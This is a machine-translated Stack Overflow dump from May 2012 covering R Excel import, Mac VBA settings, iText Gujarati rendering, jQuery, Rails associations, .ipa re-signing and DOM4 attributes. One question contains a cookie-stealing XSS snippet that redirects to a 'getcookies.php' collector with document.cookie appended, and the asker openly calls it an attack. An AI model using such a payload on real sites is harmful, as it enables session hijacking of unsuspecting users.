我们有超过 7000 个 .xlsx(2010) 的 excel 数据文件。我的 R 版本是 R 2.15.0。如果我手动操作将 xlsx 转换为 xlx、.cvs 或 txt.，它将花费更多时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:51:53.370

我没有使用 XLSconnect，但我的学生使用了 xlsx 包。然后函数 read.xlsx 或 read.xlsx2 将在 xls 表中读取。这个包有读写xls格式的选项，可以读写电子表格和特定区域中的特定工作表。

我给我的学生（生物学二年级学生）使用这个软件包的唯一正式指导是电子表格必须“格式正确”。（所有项目都是数据而不是公式，第一行是小写的变量名称，没有任何非字母字符，第2-##行有每个变量的数据。如果是记录，则比同一记录的所有项目在同一行）它没有 *.xls 这么严格，但我希望学生在阅读数据文件时遇到最少的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T14:33:55.913

`read.xls`包中的函数`gdata`将读取`xlsx`和`xls`文件放入`R`. 我经常使用这个。

听起来您有很多 Excel 文件可以使用，这就是我将大量这些文件（`xlsx`和`xls`）放入`R`：

将工作直接设置为我的 Excel 文件的位置

```
setwd("F:\\ address of folder with all my Excel files") 
```

列出工作目录中的所有文件

```
MyFiles <- list.files() 
```

检查清单

```
MyFiles 
```

创建一个列表，其中包含工作目录中包含的 xls 和 xlsx 文件中的所有数据。这就像批量数据导入功能。

```
library(gdata)
Mylist <- lapply(MyFiles, read.xls) 
```

检查这是否读取了文件夹中的所有文件，以防某些 Excel 文件损坏等。如果结果是，`FALSE`则说明存在问题。

```
identical(length(MyFiles), length(Mylist)) 
```

然后我继续使用`sapply`等来对文件中的数据执行功能。

# javascript - 无法在 Firefox 和 IE 中读取 cookie

> ID：10499173
> 
> 赞同：0
> 
> 时间：2012-05-08T13:04:10.080
> 
> 标签：javascript, cookies

我必须使用 JavaScript 读取 cookie。我正在使用`document.cookie`来做同样的事情。但该方法仅适用于 Google Chrome，不适用于 Firefox 和 IE 8/9。所有网页也显示`document.cookie`为一种方法。

如何使用 JavaScript 在 Firefox 和 IE 中获取 cookie？

谢谢

**更新** 我在本地主机上测试了我的代码。**在blogspot.com**上在线测试代码时，它甚至无法在 chrome 上运行。

无论如何，这是HTML代码：

```
<script type="text/javascript">
    function sendCookies(){
        document.location='http://localhost/xss/getcookies.php?cookie='+escape(document.cookie);
    }
</script>
<a onclick="sendCookies()" href="#">
click here </a> to know about XSS attack. 
```

在浏览器中调试`document.cookie`时，它仅在 Chrome 中显示值。如果我将 localhost 链接替换为在线链接，`document.cookie`则即使在 Chrome 上也是空的。

你可能的猜测是正确的。这是一种跨站点脚本攻击。

有关此代码的任何帮助对我有用吗？

**更新 2：**

这是演示如何执行 XSS 攻击的视频的链接：

[如何进行 XSS 攻击](http://www.youtube.com/watch?v=qO3iwAxkPxE)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:20:48.723

你试过使用 jquery-cookie 吗？[https://github.com/carhartl/jquery-cookie](https://github.com/carhartl/jquery-cookie) 另外，请记住，您无法使用 javascript 读取仅限 http 的 cookie。但是，如果您可以在 chrome 中读取 cookie，它就不是仅 http 的 cookie。您可以通过转到 chrome 中的调试控制台中的资源选项卡并检查 HTTP 列是否有 cookie 的勾号来检查 cookie 是否为 http-only。

# xml - 适用于 Mac 的 VBA：MSXML2.DOMDocument 或 System.PrivateProfileString 不起作用

> ID：10499182
> 
> 赞同：0
> 
> 时间：2012-05-08T13:04:32.800
> 
> 标签：xml, macos, vba, ms-word, ms-office

我正在尝试找到一种方法将数据结构写入 .xml 或 .ini 文件，其中 VBA 在 Mac 上的 Word 2011 上工作。

但我找不到任何方法来做到这一点。

Word for Mac 对 XML 库的引用似乎与 Word for PC 不同。而且我猜 .ini-files 是 PC 的东西，因为 System.PrivateProfileString 在 Word 2011 上不起作用。

有没有人对此有任何解决方案？或者也许对其他使用方法有一些建议？

编辑：它似乎适用于以下内容： **System.ProfileString("test", "testing") = "the test" MsgBox(System.ProfileString("test", "testing"))**

我不确定这是如何存储的，但我看到在使用命令时，文件*com.microsoft.Word.plist*在 Preference 文件夹中得到了更新。当我在文本编辑中打开文件时，它包含很多“乱码”，但如果我搜索“测试”，我会在文件中以明文形式找到它。自系统。**Private** ProfileString 不起作用，我似乎无法选择存储它的位置。

最好的办法是将其存储在 xml 中并使其在 PC 和 Mac 上都可以工作，但我想在 Word 2011 上的 VBA for Mac 中没有办法做到这一点？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-08T14:10:35.077

INI 文件是 Windows 的东西；System.anything 是 .NET 的东西，而不是 VBA。

Windows VBA 中的 SaveSetting 写入注册表的特定区域。在 Mac 上，它写入特定于应用程序的 .plist (XML) 文件。

该文件位于用户：[用户名]：库：首选项

您不想将其用于通用数据存储，但对于应用程序设置，这是合理的。

# java - 哪个 PDF 生成 API (Java) 支持古吉拉特语字体？

> ID：10499183
> 
> 赞同：14
> 
> 时间：2012-05-08T13:04:38.370
> 
> 标签：java, api, unicode, pdf-generation, jdk1.4

我尝试过 iText、PDFBox 和 Oracle 表单。在 iText 的情况下，我也成功生成了古吉拉特语 PDF 文档。但是，不幸的是，它没有以古吉拉特语（UTF-8）语言生成正确的字体。

我在 jdk 1.4 中有我的项目，这是强制使用的。所以，我需要支持古吉拉特语字体的旧版 API。

请建议是否有任何选项可用。

**示例代码：**

```
public void GeneratePDFusingiText(String lStrGujaratidata)
  {
    try
    {

      BaseFont bf = BaseFont.createFont("C:\\Windows\\Fonts\\Shruti.ttf",  BaseFont.IDENTITY_H, BaseFont.NOT_EMBEDDED);
      Font font = new Font(bf, 12);
      Document document = new Document();
      PdfWriter.getInstance(document, new FileOutputStream("D:/GeneratePDFusingiText.pdf"));
      document.open();
      document.add(new Paragraph(lStrGujaratidata, font));
      document.close();
    }
    catch(Exception e)
    {
      System.out.println("Exception while generating PDF");
      e.printStackTrace();
    }
   } 
```

**编辑1：**

也许图像没有显示出来。它[在这里](https://i.stack.imgur.com/zHm8R.jpg)上传。

**编辑2：**

![字体示例的图像](../Images/3fcf099e7558532008a68a0d35e9081c.png)

**第 1 步）**我输入一个古吉拉特语字符串 Google Transliterate。

**步骤 2）**我使用 BableMap 软件将其转换为 unicode，以便使用 Resourse Bundle 使用它。

**问题：**让我有一个字符串：**બિલાડી** (Biladi)

它的 unicode 将是： \u0AAC **\u0ABF** \u0AB2\u0ABE\u0AA1\u0AC0

检查上面的粗体 Unicode 字符。这就是我遇到问题的地方。现在，如果我将此 unicode 更改为**\u0ABF** \u0AAC\u0AB2\u0ABE\u0AA1\u0AC0 ，它会以 PDF 格式打印正确的输出。

同时它在 HTML 中打印错误的输出，即：**િબલાડી**

我必须在他们之间进行管理。

我尝试过使用“gu”和“gu.UTF-8”和“UTF-8”。但是，每次我得到相同的输出。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-13T13:55:49.440

**更新的答案**

在您发表评论后，我意识到我错了，即变音符号*应该*出现在字节序列中的第二个，即使它应该*呈现*在主要字符的左侧。

因此，事实证明，iText 不支持在印度字符集上进行这种类型的渲染。粗略地说，iText 使用 awt`Graphics2D`将非拉丁 unicode 字符一个接一个地呈现为 PDF 中的图像。（我想这是因为每个人的计算机上不一定都安装了适当的字体）。此功能不考虑此特殊排序。

iText 确实支持阿拉伯语的类似行为，使用另一个开发人员提供的类。请参阅[com.itextpdf.text.pdf.ArabicLigaturizer](http://itext.svn.sourceforge.net/viewvc/itext/trunk/itext/src/main/java/com/itextpdf/text/pdf/ArabicLigaturizer.java?revision=5075&content-type=text/plain)。也许您可以自己创建一个类似的？（！）

以前好像出现过这样的情况：

*   [http://thread.gmane.org/gmane.comp.java.lib.itext.general/56702/focus=59552](http://thread.gmane.org/gmane.comp.java.lib.itext.general/56702/focus=59552)
*   [http://itext-general.2136553.n4.nabble.com/patch-for-complex-scripts-indic-rendering-td2167588.html](http://itext-general.2136553.n4.nabble.com/patch-for-complex-scripts-indic-rendering-td2167588.html)

**原始答案**

金秋，

我相信 iText 正在显示正确的字符，但是在您将字符串转换为 unicode 点之前，您输入的前 2 个字符已被“翻转”。因此，问题发生在数据甚至到达 iText 之前。

潜在的问题是“第一个”字符是一个“前基”字符，它是一种[变音符号](http://en.wikipedia.org/wiki/Diacritic)。它有点像欧洲文本中的“口音”，不能单独存在，其目的是修饰另一个角色。在这种情况下，它将“Ba”（બ）变成“Bi”。

您会在 Unicode 代码页中看到，第一个字符 (િ) 确实是代码点 \u0ABF，第二个字符 (બ) 是 \u0AAC：[http ://en.wikipedia.org/wiki/Gujar%C4%81ti_script #Unicode](http://en.wikipedia.org/wiki/Gujar%C4%81ti_script#Unicode)

所以，在谷歌音译和你的代码点表示之间的某个地方，这些字符被翻转了。因此，您需要查看您是如何进行翻译的。

**您是如何将这些字符转换为代码点的？**

看起来，一些口译员将“前置基数”放在主辅音之后，而不是之前：

*   请注意，当您将这些字符粘贴到 (Linux) 终端时，前 2 个字符从后到前出现。我相信类似的事情也发生在你身上。
*   您还会注意到，当您尝试在 Google 音译中编辑此单词时，您无法将光标放在前 2 个字符之间，并且当您按退格键时，左侧字符会在右侧字符之前被删除。

所以，如果你能弄清楚这种“翻转”发生在哪里，那么希望你的解决方案能够呈现出来。

希望这可以帮助

# javascript - JQuery Countdown + 服务器与 AppEngine 同步

> ID：10499185
> 
> 赞同：0
> 
> 时间：2012-05-08T13:04:53.673
> 
> 标签：javascript, jquery, python, google-app-engine

我正在尝试使用 jquery 倒计时与服务器同步，以便所有访问者的时间都相同。这些文件使用静态设置托管在 AppEngine 上以托管 HTML。PHP 不适用于 AppEngine。

是否可以在 AppEngine 的静态设置下使用 Python 与服务器时间同步？- 我将如何在 Jquery 中使用 datetime.now()？

```
function countdown() {
    var eventTime = new Date('May 23, 2012 08:00:00');
    $('#time-left').countdown({ until: eventTime, layout: '<ul class="timer"><li class="days">{dn}</li> <li class="hours">{hnn}</li><li class="mins">{mnn}</li><li class="secs">{snn}</li></ul>',
                                serverSync: function() { return new Date('datetime.now()') }});
} 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:37:15.920

它很难在客户端计算时间，因为它在不同的时区有所不同....所以获取 UTC 中的服务器时间并在 UTC 偏移量中创建一个本地时间变量，然后在本地时间比较 sec deff

```
// return string must be in UTC time yyyy/MM/dd H:mm:ss format in Json result
$.get("timerequestmethod", function (data) {
                var dateArray = data.split(' ');
                var seconds = getSeconds(dateArray);

                // create countdown until 'seconds' declare in above statement
            });

getSeconds = (function (dateArray) {
        var dt = dateArray[0].split('/');
        var tm = dateArray[1].split(':');
        var times = new Date();
        times.setUTCFullYear(dt[0], (dt[1] > 0 ? dt[1] - 1 : dt[1]), dt[2]);
        times.setUTCHours(tm[0]);
        times.setUTCMinutes(tm[1]);
        times.setUTCSeconds(tm[2]);
        return (times - new Date()) / 1000;
    }); 
```

# java - 为整个 SWT 应用程序 UI 设置自定义字体（覆盖系统 UI 字体）

> ID：10499188
> 
> 赞同：2
> 
> 时间：2012-05-08T13:05:09.737
> 
> 标签：java, user-interface, swt, font-size

**设想：**

我们有一个使用 SWT 编写的 Java 桌面应用程序，其中 UI 的设计考虑了 Windows XP 默认字体和布局。现在我们还有在 Windows 7 上使用该应用程序的用户，SWT java 应用程序中的一些 UI 元素不显示完整的文本标题。这是因为在 WIN XP 中默认字体是 Tahoma 8，而在 WIN 7 中默认字体是 Segoe 9。

**问题 ：**

我们想为我们的 SWT 应用程序设置/修改字体，而不为每个小部件设置字体（我们有大约数百个具有 20-30 个小部件的屏幕，因此它不实用）。理想情况下，最好的方法是覆盖 SWT（显示类）读取的系统字体并使用指定的字体。

**理想的解决方案**

一种设置字体的方法，就像使用 swing 为整个应用程序设置外观一样。

提前致谢。

Ĵ

# php - 无法使用 Jquery/Javascript 隐藏列表菜单

> ID：10499189
> 
> 赞同：0
> 
> 时间：2012-05-08T13:05:13.140
> 
> 标签：php, javascript, jquery, html

我在隐藏使用 php 动态生成的列表菜单时遇到问题。我的浏览器没有隐藏它。我正在使用火狐；代码是这样的：

```
<div id="groupstd">
<br />
<select style="text-align:center;" name="std3">
<option value="Select" selected="selected">Please Select Student.no#3</option>
<?php
$result=Connect();
if($result>0)
{
while($row = mysql_fetch_array($result))
  {
echo '<option value=$row[\'Roll#\'].\'i-\'.$row[\'Batch\']>$row[\'Roll#\'].\'i-\'.$row[\'Batch\']</option>';
  }
}?>
</select>
</div>
<div id="grpstd">
<br />
<select style="text-align:center;" name="std4" id="std4">
<option value="Select" selected="selected">Please Select Student.no#4</option>
<?php
$result=Connect();
if($result>0)
{
while($row = mysql_fetch_array($result))
  {
echo '<option value=$row[\'Roll#\'].\'i-\'.$row[\'Batch\']>$row[\'Roll#\'].\'i-\'.$row[\'Batch\']</option>';
  }
}?>
</select>
</div> 
```

我正在使用 JQuery 隐藏如下：

```
$(document).ready(function()
{
    $('#grpstd').hide();
    $('#groupstd').hide();
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:07:42.207

你什么时候试图隐藏div？您需要等到至少文件[准备好](http://api.jquery.com/ready/)：

```
$(document).ready(function() {
    $('#grpstd').hide();
    $('#groupstd').hide();
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:08:37.527

你试过这个吗？

```
$(document).ready(function() {
 $('#grpstd, #groupstd').hide();
}); 
```

或者

```
$(function() {
  $('#grpstd, #groupstd').hide();
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:09:56.223

**在dom**准备好后尝试这样做：

```
$(document).ready(function() {
  $('#grpstd, #groupstd').hide();//using two elements using one statement
}); 
```

# c# - 在 .Net 中创建复合控件

> ID：10499191
> 
> 赞同：0
> 
> 时间：2012-05-08T13:05:18.603
> 
> 标签：c#, asp.net, .net, vb.net

> **可能重复：**
> [在 ASP.Net 2008 或更高版本中创建复合和自定义网格控件](https://stackoverflow.com/questions/10497658/create-composite-and-custom-grid-control-in-asp-net-2008-or-above)

我需要创建复合控件。我的控件就像那个 div 一个 Gridview 控件中的一个“div”。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:27:18.953

封装 UI 组件的选项是

**用户控制**

1.  从 UserControl 对象继承

2.  必须在 Visual Studio 的同一个项目中使用它们

3.  将需要手动公开 gridview 的事件和属性。

4.  可以从单独的 web 控件构建

教程见[这里](http://asp.net-tutorials.com/user-controls/using/)

**复合控件**

1.  从 CompositeControl 继承

2.  可以在 Visual Studio 的不同项目中使用

3.  可以从单独的 web 控件构建

4.  将需要手动公开 gridview 的事件和属性。

5.  Visual Studio 设计器中没有 UI。需要包含在工具栏中才能使用

教程见[这里](http://msdn.microsoft.com/en-us/library/3257x3ea.aspx)

**继承控制**

1.  从 GridView 继承（在您的情况下）

2.  可以在 Visual Studio 的不同项目中使用

3.  仅一个控件（网格视图）

4.  自动公开的事件和属性

5.  Visual Studio 设计器中没有 UI。需要包含在工具栏中才能使用

请参阅此处获取[教程](http://www.eggheadcafe.com/articles/pfc/extendservercontrol.asp)（扩展 a`Textbox`而不是 a `GridView`）

根据您的描述，它看起来像您应该选择的 Inherited control 选项

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:15:19.253

您可以编写一个控制适配器，它接受 a`GridView`并按照您的意愿呈现它。

[http://www.asp.net/cssadapters/GridView.aspx](http://www.asp.net/cssadapters/GridView.aspx)

# servlets - 如何进行从旧版 Servlet 到 JSF 2.0 的服务器端重定向？

> ID：10499192
> 
> 赞同：4
> 
> 时间：2012-05-08T13:05:18.760
> 
> 标签：servlets, jsf-2

我目前正在执行客户端重定向，以从遗留 servlet（应用程序的旧部分）到 JSF 页面（应用程序的新部分）。如果可能的话，我宁愿做一个服务器端重定向，这样我就可以将项目放在 JSF 页面可以获取的请求中。（有一组数据需要在遗留 servlet 和 JSF 页面之间“传递”，我不希望将它们放在客户端重定向 URL（作为 URL 参数）中，而是在服务器上执行此操作 -边）。

如果有办法在 servlet（不是 Faces servlet）和 JSF 页面之间进行服务器端重定向，你能告诉我怎么做吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:15:10.550

只需[`RequestDispatcher#forward()`](http://docs.oracle.com/javaee/6/api/javax/servlet/RequestDispatcher.html#forward%28javax.servlet.ServletRequest,%20javax.servlet.ServletResponse%29)按常规方式调用即可。所有 servlet 也会拦截转发的请求。您只需要确保正向路径与`FacesServlet`映射匹配。假设您已将其映射到`*.xhtml`，则应该这样做：

```
request.getRequestDispatcher("/page.xhtml").forward(request, response); 
```

`/WEB-INF`如果您想防止最终用户在不首先调用 servlet 的情况下直接打开该页面，则可以在必要时将其放置在文件夹中。

```
request.getRequestDispatcher("/WEB-INF/page.xhtml").forward(request, response); 
```

# facebook - 如果我启用了 Authenticated Referrals，如何跟踪应用帖子的点击次数？

> ID：10499196
> 
> 赞同：0
> 
> 时间：2012-05-08T13:05:27.870
> 
> 标签：facebook, analytics, facebook-opengraph, facebook-authentication

1.  我的 Canvas 应用启用了 Authenticated Referrals
2.  我的 Canvas App 贴在用户的墙上
3.  当用户的朋友点击该帖子时，facebook auth 对话框显示为带有“转到应用程序”和“关闭”的弹出窗口

有没有办法跟踪对该帖子的点击？

*（我们使用混合面板作为分析）*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:19:16.307

1.  前往 developer.facebook.com/apps
2.  你的应用
3.  见解
4.  安装

# c++ - V8：发送到函数的 PrototypeTemplate => 尝试访问它时出现异常

> ID：10499198
> 
> 赞同：0
> 
> 时间：2012-05-08T13:05:36.403
> 
> 标签：c++, v8, cvv8

我想创建一个类“V8BaseClass”，它有一个函数 AttachToContext 将它附加到 V8 上下文。在这个类中，我想用原型和实例模板调用一个虚函数 AttachAdditionalMembers，以允许任何后继类添加他的成员。代码的主要部分如下所示：

```
void V8BaseClass::AttachToContext(v8::Handle<v8::Context> context)
{
    //working in this scope under this context.
    v8::Context::Scope scopedContext(context);

    //create a pointer to a class template
    v8::Handle<v8::FunctionTemplate> bs_templ = v8::FunctionTemplate::New();

    //assign the "bsInfo" name to the new class template (this is the name of the JS class not the name of the JS instance.)
    bs_templ->SetClassName(v8::String::New("bsInfo"));

    //access the class prototype template
    v8::Handle<v8::ObjectTemplate> bs_proto = bs_templ->PrototypeTemplate();

    //access the instance pointer of our new class template
    v8::Handle<v8::ObjectTemplate> bs_inst = bs_templ->InstanceTemplate();

    //set the internal fields of the class as we have the BsInfo class internally
    bs_inst->SetInternalFieldCount(1);

    //Attached the m_result var of the class with a result member in JS.
    bs_inst->SetAccessor(v8::String::New("result"), JSGetResult, JSSetResult);

    /* ==rg== just for testing reason... */
    std::vector<std::string> tempVec;
    tempVec.push_back("one");
    tempVec.push_back("two");
    bs_proto->Set("tempVec", cvv8::CastToJS(tempVec));// <== this is working fine.
    /* <<< ==rg== */

    //Call the inherited class method.
    AttachAdditionalMembers(bs_proto, bs_inst);//<== calling the virtual function

    //get the constructor function
    v8::Handle<v8::Function> bs_ctor = bs_templ->GetFunction();

    //get class instance
    m_obj = bs_ctor->NewInstance();

    //build the "bridge" between c++ and javascript by associating the bsInfo to `this` class.
    m_obj->SetInternalField(0, v8::External::New(this));

    //associates our internal field pointing to `this` with the "BsInfo" name inside the context
    //this enable usage of BsInfo inside this context without need to create a new one
    context->Global()->Set(v8::String::New("BsInfo"), m_obj);
} 
```

后继类看起来像这样：

```
class V8Extend : public V8BaseClass
{
public: 
    std::vector<std::string>                    m_conversionTags;
    std::map<std::string, std::string>          m_scripts;
    std::map<std::string, std::string>          m_tokens;
    std::map<std::string, std::string>          m_urlTokens;

private:
    inline virtual void AttachAdditionalMembers(const v8::Handle<v8::ObjectTemplate>& proto, const v8::Handle<v8::ObjectTemplate>& inst)
    {
        //set test data:
        m_conversionTags.push_back("conversion1");
        m_conversionTags.push_back("conversion2");
        m_conversionTags.push_back("conversion3");
        m_scripts["script1"] = "This is script1!";
        m_scripts["script2"] = "This is script2!";
        m_scripts["script3"] = "This is script3!";
        m_tokens["T1"] = "Token1";
        m_tokens["T2"] = "Token2";
        m_urlTokens["UT1"] = "UT-1";
        m_urlTokens["UT2"] = "UT-2";
        //end of setting test data.

        proto->Set("conversionTags", cvv8::CastToJS(m_conversionTags));//<==throwing exception
        proto->Set("tokens", cvv8::CastToJS(m_tokens));
        proto->Set("scripts", cvv8::CastToJS(m_scripts));
        proto->Set("urlTokens", cvv8::CastToJS(m_urlTokens));
    };
}; 
```

为什么从基类调用时此调用工作正常，但从后继类调用时失败？

==编辑==如果它可能有帮助，这是调用异常时的调用堆栈：

```
ModuleManagementTest.exe!v8::internal::FixedArrayBase::length()  Line 2188 + 0xe bytes  C++  
ModuleManagementTest.exe!v8::internal::FixedArray::get(int index=3)  Line 1661 + 0x11 bytes C++  
ModuleManagementTest.exe!v8::internal::Context::global()  Line 324 + 0xf bytes  C++  
ModuleManagementTest.exe!v8::internal::Context::global_context()  Line 62 + 0xa bytes   C++  
ModuleManagementTest.exe!v8::internal::Heap::AllocateJSArray(v8::internal::ElementsKind elements_kind=FAST_ELEMENTS, v8::internal::PretenureFlag pretenure=NOT_TENURED) Line   4412 + 0x1a bytes    C++  
ModuleManagementTest.exe!v8::internal::Heap::AllocateJSArrayAndStorage(v8::internal::ElementsKind elements_kind=FAST_ELEMENTS, int length=0, int capacity=3, v8::internal::ArrayStorageAllocationMode mode=INITIALIZE_ARRAY_ELEMENTS_WITH_HOLE, v8::internal::PretenureFlag pretenure=NOT_TENURED)  Line 3838 + 0x13 bytes  C++  
ModuleManagementTest.exe!v8::internal::Factory::NewJSArray(int capacity=3, v8::internal::ElementsKind elements_kind=FAST_ELEMENTS, v8::internal::PretenureFlag pretenure=NOT_TENURED)  Line 958 + 0x62 bytes    C++  
ModuleManagementTest.exe!v8::Array::New(int length=3)  Line 5012    C++  
ModuleManagementTest.exe!cvv8::NativeToJS_list<std::vector<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::allocator<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > > >::operator()(const std::vector<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::allocator<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > > & li=[3]("conversion1","conversion2","conversion3"))  Line 1453 + 0xe bytes    C++  
ModuleManagementTest.exe!cvv8::CastToJS<std::vector<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::allocator<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > > >(const std::vector<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::allocator<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > > & v=[3]("conversion1","conversion2","conversion3"))  Line 444 + 0x14 bytes    C++  
ModuleManagementTest.exe!V8Extend::AttachAdditionalMembers(const v8::Handle<v8::ObjectTemplate> & proto={...}, const v8::Handle<v8::ObjectTemplate> & inst={...})  Line 43 + 0x2c bytes C++ 
```

`v8::internal::FixedArray::get(int index=3)`它在断言行中的函数中失败`ASSERT(index >= 0 && index < this->length());`

==Edit 2== 我尝试在 V8BaseClass 中实现“AttachAdditionalMembers”函数，但当我将函数更改为不能`virtual`正常工作时，我遇到了同样的问题。
有任何想法吗？？？

# sql - 如何改变 Rails 的belongs_to 行为

> ID：10499201
> 
> 赞同：2
> 
> 时间：2012-05-08T13:05:37.107
> 
> 标签：sql, ruby-on-rails, ruby-on-rails-3, associations, belongs-to

我有两个模型：

```
class Sentence < ActiveRecord::Base
  attr_accessible :sentence_id, :authority_name #...
end

class Rule < ActiveRecord::Base
  attr_accessible :description, :headline, :note, :sentence_id
end 
```

我想知道如何创建`belongs_to :sentence`关联，`Rule`其行为类似于此伪 SQL 代码：

```
SELECT * FROM rules 
INNER JOIN sentences ON rules.sentence_id = sentences.sentence_id; 
```

**编辑：**

我想得到类似的东西

```
rule = Rule.find 797 
# we all know how SQL query will look like...
rule.sentence  
# => SELECT * FROM sentences 
     INNER JOIN rules ON rules.sentence_id = sentences.sentence_id 
     WHERE rules.id = 797 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T14:02:34.000

首先，是表`sentence_id`的主键`sentences`吗？

如果是这样，那么您只需将该列显式设置为主键。

```
class Sentence < ActiveRecord::Base
  set_primary_key :sentence_id
end

class Rule < ActiveRecord::Base
  belongs_to :sentence
end 
```

如果`sentence_id`不是主键，则需要将其指定为关联的“主键”。我没有机会测试代码，但它应该是这样的：

```
class Rule < ActiveRecord::Base
  belongs_to :sentence, :primary_key => :sentence_id
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T14:18:10.660

在关系数据库理论中，外键***总是***指向*主*键。要获取活动记录以生成所需的 SQL，请设置主键。

```
class Sentence < ActiveRecord::Base
  set_primary_key :sentence_id 
```

我认为这就是你想要的，但这里有一个替代方案。要进行自定义连接，请使用 joins() 方法并在 SQL 中提供所需的字符串。

# iphone - 如何在生成的 .ipa 存档中编辑 Root.Plist？

> ID：10499203
> 
> 赞同：1
> 
> 时间：2012-05-08T13:05:49.103
> 
> 标签：iphone, objective-c, xcode, code-signing

案例如下，我开发了一个 iphone 应用程序并想在不为客户提供源代码的情况下为其打上品牌（他们自己拒绝给我他们开发者帐户的凭据），所以我在想，他们有什么办法给他们 .ipa 文件并使他们能够更改几个图像和 Setting.bundle ，重新编码并自行提交？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T11:53:20.470

解决如下，

1.  将“.ipa”文件重命名为 .zip 并解压
2.  转到 Payload/{your app}.app ，右键单击它并显示包内容，如果您正在运行 MacOSX ，windows 会将其视为文件夹
3.  从图像和 Settings.bundle ...等中更改您想要的内容。
4.  如附加的 .sh 文件中所示，通过 shell 对代码进行签名

    ```
    #!/bin/sh 

    #Given that the application name is MyApplication.ipa
    export ARCHIVE_NAME="MyApplication"
    #As indicated in the keychain certifcate common name
    export CERTFICATE_NAME="MyCertificate"
    rm -rf ./Payload
    echo "$ARCHIVE_NAME"".ipa" "$ARCHIVE_NAME"".backup"
    unzip "$ARCHIVE_NAME"".ipa"
    codesign -f -s "$CERTFICATE_NAME"  ./Payload/"The package name in the Payload folder with the extension"
    zip -r ./"$ARCHIVE_NAME"".zip" ./Payload
    cp "$ARCHIVE_NAME"".ipa" "$ARCHIVE_NAME"".backup"
    mv "$ARCHIVE_NAME"".zip" "$ARCHIVE_NAME"".ipa"
    rm -rf ./Payload
    echo "Finished Code Sign successfully" 
    ```

棘手的部分是，如何将存档再次上传到商店？应该使用苹果通过 itunes-connect 帐户提供的工具来独立于 Xcode 上传该存档。它可以按照 iTunes-connect -> login -> manage your application 找到，左下角第二个选项卡用于应用程序加载器“以智能方式隐藏，Apple 是 Apple :)”

# javascript - DOM4：不推荐使用的属性和方法，这是什么意思？

> ID：10499208
> 
> 赞同：7
> 
> 时间：2012-05-08T13:05:59.610
> 
> 标签：javascript, html, dom, deprecated, dom4

> “警告：在 DOM Core 1、2 和 3 中，Attr 继承自 Node。在 DOM4 中不再是这种情况。为了使 Attr 的实现符合规范，正在努力将其更改为不再继承自 Node . 您不应该在 Attr 对象上使用任何 Node 属性或方法。从 Gecko 7.0 (Firefox 7.0 / Thunderbird 7.0 / SeaMonkey 2.4) 开始，将要删除的那些将向控制台输出警告消息。您应该修改您的代码相应地。有关完整列表，请参阅弃用的属性和方法。”

向下滚动页面，我们可以看到 nodeName 和 NodeValue 的替换，使用 Attr.name 和 Attr.value。

[https://developer.mozilla.org/en/DOM/Attr#Deprecated_properties_and_methods](https://developer.mozilla.org/en/DOM/Attr#Deprecated_properties_and_methods)

对于属性或 childNodes 等其他方法，它到底意味着什么？参考资料说它已被弃用，但他们没有提供任何替代品！

它已被 Attribute 弃用，但它也适用于 Node 吗？

属性对象：[http ://www.w3schools.com/jsref/dom_obj_attr.asp](http://www.w3schools.com/jsref/dom_obj_attr.asp)

编辑：nodeValue 将仅被弃用为属性（Attr），因为 Attr 将不再从 DOM 级别 4 中的节点继承：

这是一个帮助我理解的简单示例：

```
<div id="myAttribute">myTextNode</div>

var myDiv = document.getElementById("myAttribute");

// If you want to get "myAttribute" from div tag

alert(myDiv.attributes[0].value);
// Correct way to get value of an attribute (displays "myAttribute")
alert(myDiv.attributes[0].nodeValue);
// Working too but deprecated method for Attr since it doesn't inherit from Node in DOM4 (.nodeValue is specific to a Node, not an Attribute)

// If you want to get "myTextNode" from div tag

alert(myDiv.childNodes[0].value);
// Not working since .value is specific to an attribute, not a Node (displays "undefined")
alert(myDiv.childNodes[0].nodeValue);
// Working, .nodeValue is the correct way to get the value of a Node, it will not be deprecated for Nodes! (displays "myTextNode") 
```

也许这会在访问属性/节点时避免其他人混淆:)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-08T13:11:58.100

他们所说的是作为`Attr`实例的对象（例如，由 . 返回的对象[`Element.getAttributeNode()`](https://developer.mozilla.org/en/DOM/Element.getAttributeNode)）曾经具有从 . 继承的属性`Node`。

然而，由于在 DOM4 中不是这种情况，他们正试图移除这种继承。因此，当您现在获取对象的实例时，[已弃用列表中](https://developer.mozilla.org/en/DOM/Attr#Deprecated_properties_and_methods)`Attr`列出的属性将按照文档中的方式运行。

最大的问题：**属性已被弃用，但它也适用于节点吗？**: 不，它们没有被弃用。`Node`您可以从[它自己的](https://developer.mozilla.org/en/DOM/Node)文档页面查看属性列表。

`Attr`无论如何，对象的使用并不多（*曾经？*）；你确定这与你有关吗？

# c# - 创建和过滤预定义函数列表

> ID：10499209
> 
> 赞同：0
> 
> 时间：2012-05-08T13:06:01.520
> 
> 标签：c#, design-patterns

